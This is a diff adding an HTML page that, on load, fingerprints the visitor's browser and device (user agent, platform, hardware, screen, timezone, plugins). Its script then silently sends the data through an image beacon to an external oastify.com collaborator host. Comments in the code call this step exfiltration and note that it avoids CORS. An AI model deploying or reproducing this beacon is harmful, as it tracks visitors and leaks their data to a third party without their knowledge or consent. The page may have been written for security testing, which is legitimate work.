@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Browser &amp; PC Details with Exfiltration</title>
+  <style>
+    body { font-family: sans-serif; margin: 2rem; }
+    pre { background: #f4f4f4; padding: 1rem; }
+  </style>
+</head>
+<body>
+  <h1>Browser and PC Details</h1>
+  <pre id="details"></pre>
+  
+  <script>
+    function getBrowserAndPCDetails() {
+      const details = {
+        // Browser properties
+        userAgent: navigator.userAgent,
+        appName: navigator.appName,
+        appVersion: navigator.appVersion,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        online: navigator.onLine,
+        
+        // Hardware details (if available)
+        hardwareConcurrency: navigator.hardwareConcurrency, // number of logical processors
+        deviceMemory: navigator.deviceMemory || "Not available",
+        
+        // Screen details
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          colorDepth: screen.colorDepth,
+          pixelDepth: screen.pixelDepth
+        },
+        
+        // Timezone offset in minutes
+        timezoneOffset: new Date().getTimezoneOffset(),
+        
+        // Plugins list (if any)
+        plugins: []
+      };
+
+      // Collect plugins information if available
+      if (navigator.plugins && navigator.plugins.length > 0) {
+        for (let i = 0; i < navigator.plugins.length; i++) {
+          details.plugins.push(navigator.plugins[i].name);
+        }
+      } else {
+        details.plugins = "No plugins information available";
+      }
+      
+      return details;
+    }
+
+    // Get the details
+    const details = getBrowserAndPCDetails();
+    
+    // Display details on the page
+    document.getElementById("details").textContent = JSON.stringify(details, null, 2);
+    
+    // Log details for debugging
+    console.log("Browser & PC Details:", details);
+    
+    // Prepare report with timestamp and details
+    const report = encodeURIComponent(JSON.stringify({
+      timestamp: new Date().toISOString(),
+      details: details
+    }));
+    
+    // Exfiltration: Create an image to send the data without triggering CORS errors
+    const exfiltrationUrl = `https://od547dymv9h693do4u2sfx1nze55t2hr.oastify.com/?report=${report}`;
+    const img = new Image();
+    img.src = exfiltrationUrl;
+    console.log('Exfiltration request sent to od547dymv9h693do4u2sfx1nze55t2hr.oastify.com');
+  </script>
+</body>
+</html>
